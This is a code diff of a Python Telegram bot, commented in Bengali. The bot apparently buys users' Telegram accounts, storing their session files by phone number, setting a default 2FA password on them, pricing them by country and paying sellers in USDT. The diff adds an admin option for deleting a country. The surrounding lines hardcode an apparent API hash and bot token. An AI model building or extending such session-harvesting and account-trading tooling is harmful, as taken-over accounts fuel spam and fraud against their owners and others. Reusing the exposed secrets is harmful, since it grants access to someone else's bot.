@@ -18,12 +18,10 @@ API_HASH = "119a3ac4fd3dc368df92ae6d81f3bb3e"
 BOT_TOKEN = "8288574083:AAE9eidUl-iZl0I4Sbt8jcDM7k8JJqSYK_Y"
 ADMIN_ID = 8095751648
 
-# 📢 আপনার দেওয়া চ্যানেল আইডিগুলো একবারে পারফেক্ট ফরম্যাটে বসিয়ে দেওয়া হলো
-MAIN_CHANNEL_ID = -1003904729385         # মেইন চ্যানেল (বাধ্যতামূলক জয়েন)
+MAIN_CHANNEL_ID = -1003904729385          # মেইন চ্যানেল (বাধ্যতামূলক জয়েন)
 SESSION_LOG_CHANNEL_ID = -1004345512666   # সেশন কনফার্মেশন চ্যানেল 
 WITHDRAW_LOG_CHANNEL_ID = -1004331985961  # উইথড্র কনফার্মেশন চ্যানেল
 
-# মেইন চ্যানেলের ইউজারনেম লিংক (এখানে আপনার আসল ইউজারনেমটি দিয়ে দিতে পারেন)
 MAIN_CHANNEL_LINK = "https://t.me/fastrecivernews" 
 # =================================================================
 
@@ -193,13 +191,12 @@ def is_user_joined_main_channel(user_id):
         return True 
 
 def check_force_join(message):
-    """আপনার রিকোয়েস্ট অনুযায়ী কাস্টমাইজড মেসেজ সেট করা হলো"""
     if not is_user_joined_main_channel(message.from_user.id):
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("📢 Join Our Channel", url=MAIN_CHANNEL_LINK))
         bot.send_message(
             message.chat.id, 
-            "⚠️ **Please join our main channel for more update!**\n\nবট ব্যবহার করতে আপনাকে অবশ্যই আমাদের মেইন চ্যানেলে জয়েন করতে হবে। জয়েন করার পর আবার ট্রাই করুন।", 
+            "⚠️ **Please join our main channel for more update!**\n\nবট ব্যবহার করতে আপনাকে অবশ্যই আমাদের মেইন চ্যানেলে জয়েন করতে হবে। জয়েন করার পর আবার ট্রাই করুন।", 
             reply_markup=markup
         )
         return False
@@ -320,7 +317,7 @@ def export_logic(chat_id, country_code, amount):
             try: shutil.move(os.path.join(target_dir, file + "-journal"), os.path.join(TRASH_STORAGE_DIR, file + "-journal"))
             except: pass
         os.remove(zip_filename)
-        bot.send_message(chat_id, "📥 **Files moved to Trash System successfully.** /panel থেকে ডেটা রিকভার বা পার্মানেন্টলি ক্লিয়ার করতে পারবেন।")
+        bot.send_message(chat_id, "📥 **Files moved to Trash System successfully.** /panel থেকে ডেটা রিকভার বা পার্মানেন্টলি ক্লিয়ার করতে পারবেন।")
     except Exception as e: 
         bot.send_message(chat_id, f"❌ Export Error: {e}")
 
@@ -343,16 +340,17 @@ def admin_panel_command(message):
     settings = load_settings()
     markup = types.InlineKeyboardMarkup(row_width=2)
     markup.add(types.InlineKeyboardButton("🔐 Change 2FA Password", callback_data="pnl_pass"), types.InlineKeyboardButton("🌍 Set Country (All-in-One)", callback_data="pnl_set_country"))
-    markup.add(types.InlineKeyboardButton("📂 All Session Files", callback_data="pnl_all_files"), types.InlineKeyboardButton("❌ Close Panel", callback_data="pnl_close"))
+    
+    # ❌ নতুন ডিলিট কান্ট্রি বাটন যোগ করা হলো
+    markup.add(types.InlineKeyboardButton("❌ Delete/Remove Country", callback_data="pnl_del_country"), types.InlineKeyboardButton("📂 All Session Files", callback_data="pnl_all_files"))
+    markup.add(types.InlineKeyboardButton("❌ Close Panel", callback_data="pnl_close"))
     
     trash_cnt = get_trash_file_count()
     markup.add(types.InlineKeyboardButton(f"🗑️ View Trash Files ({trash_cnt} Pcs)", callback_data="pnl_view_trash"))
     markup.add(types.InlineKeyboardButton("💥 Delete All Trash Permanent", callback_data="pnl_clear_trash"))
     
-    panel_msg = f"🛠 *Master Admin Control Panel*\n\n🔐 *Default 2FA Password:* `{settings['security_password']}`\n\n📈 *Allowed Countries:*\n"
-    for code in settings["country_prices"]:
-        panel_msg += f"• 🌍 `+{code}` ➜ Price: **${settings['country_prices'][code]}** | Cap: **{settings['country_capacity'].get(code, 100)}**\n"
-    panel_msg += f"\n🗑️ **Trash Area Size:** {trash_cnt} files currently stored (As Bin Storage)."
+    # 📋 তোর রিকোয়েস্ট অনুযায়ী এখান থেকে কান্ট্রি লিস্টের লেখাগুলো সম্পূর্ণ কেটে দেওয়া হয়েছে
+    panel_msg = f"🛠 *Master Admin Control Panel*\n\n🔐 *Default 2FA Password:* `{settings['security_password']}`\n\n🗑️ **Trash Area Size:** {trash_cnt} files currently stored (As Bin Storage)."
     bot.send_message(message.chat.id, panel_msg, reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("pnl_"))
@@ -364,8 +362,13 @@ def handle_admin_callbacks(call):
         bot.send_message(call.message.chat.id, "🔐 **Please enter the new default 2FA password:**")
         admin_state[call.from_user.id] = "wait_pass"
     elif call.data == "pnl_set_country":
-        bot.send_message(call.message.chat.id, "🌍 *Set Country Parameters (All-In-One)*\nFormat: `Code=Price=Capacity=DelayTime`")
+        bot.send_message(call.message.chat.id, "🌍 *Set Country Parameters (All-In-One)*\nFormat: `Code=Price=Capacity=DelayTime` \n\nExample: `880=0.15=50=600`")
         admin_state[call.from_user.id] = "wait_country_all"
+        
+    # ❌ ডিলিট বাটন প্রেস করলে এই মেসেজটি আসবে
+    elif call.data == "pnl_del_country":
+        bot.send_message(call.message.chat.id, "❌ **Enter the Country Code you want to delete:**\n\nExample: `880` or `52` (Don't use + sign)")
+        admin_state[call.from_user.id] = "wait_delete_country"
     
     elif call.data == "pnl_view_trash":
         if not os.path.exists(TRASH_STORAGE_DIR):
@@ -431,7 +434,6 @@ def handle_text(message):
             del admin_state[user_id]
             bot.reply_to(message, f"✅ **Your Card withdrawal request for {current_bal} USDT has been submitted!**")
             
-            # 💳 উইথড্র কনফার্মেশন শুধু Withdraw চ্যানেলে যাবে
             try: bot.send_message(WITHDRAW_LOG_CHANNEL_ID, f"📥 **Withdraw Card!**\n👤 User: `{user_id}`\n💰 Amount: {current_bal} USDT\n💳 Info: {text}")
             except: bot.send_message(ADMIN_ID, f"⚠️ Channel Fail! Card Withdraw Log: User `{user_id}` | Amt: {current_bal} | Info: {text}")
             return
@@ -451,7 +453,6 @@ def handle_text(message):
             del admin_state[user_id]
             bot.reply_to(message, f"✅ **Your USDT (BEP-20) withdrawal request for {current_bal} USDT has been submitted!**")
             
-            # 🪙 উইথড্র কনফার্মেশন শুধু Withdraw চ্যানেলে যাবে
             try: bot.send_message(WITHDRAW_LOG_CHANNEL_ID, f"📥 **Withdraw BEP20!**\n👤 User: `{user_id}`\n💰 Amount: {current_bal} USDT\n🪙 Addr: `{text}`")
             except: bot.send_message(ADMIN_ID, f"⚠️ Channel Fail! BEP20 Withdraw Log: User `{user_id}` | Amt: {current_bal} | Addr: {text}")
             return
@@ -488,6 +489,18 @@ def handle_text(message):
                     settings["country_delays"][code] = int(parts[3].strip())
                     save_settings(settings)
                     bot.reply_to(message, f"✅ Country `+{code}` updated.")
+                
+                # ❌ ডিলিট কান্ট্রির ব্যাকএন্ড প্রসেসিং লজিক
+                elif state == "wait_delete_country":
+                    code_to_del = text.replace("+", "").strip()
+                    if code_to_del in settings["country_prices"]:
+                        del settings["country_prices"][code_to_del]
+                        if code_to_del in settings.get("country_capacity", {}): del settings["country_capacity"][code_to_del]
+                        if code_to_del in settings.get("country_delays", {}): del settings["country_delays"][code_to_del]
+                        save_settings(settings)
+                        bot.reply_to(message, f"✅ **Country `+{code_to_del}` has been successfully deleted!**")
+                    else:
+                        bot.reply_to(message, f"❌ **Country `+{code_to_del}` not found in active list!**")
             except Exception as e: bot.reply_to(message, f"❌ Error: {e}")
             return
 
@@ -608,7 +621,6 @@ async def process_backup(user_id, message, data):
                 convert_pending_to_verified(user_id, price)
                 bot.send_message(message.chat.id, f"🎉 **Account {data['phone']} confirmed!** Balance moved to Verified.")
                 
-                # 🔔 সেশন সাকসেসফুল কনফার্মেশনের মেসেজটি শুধু সেশন চ্যানেলে যাবে
                 try: bot.send_message(SESSION_LOG_CHANNEL_ID, f"🔔 **New Verified Session Saved:** `{data['phone']}`")
                 except: bot.send_message(ADMIN_ID, f"⚠️ Channel Fail! New Session: `{data['phone']}`")
                 return
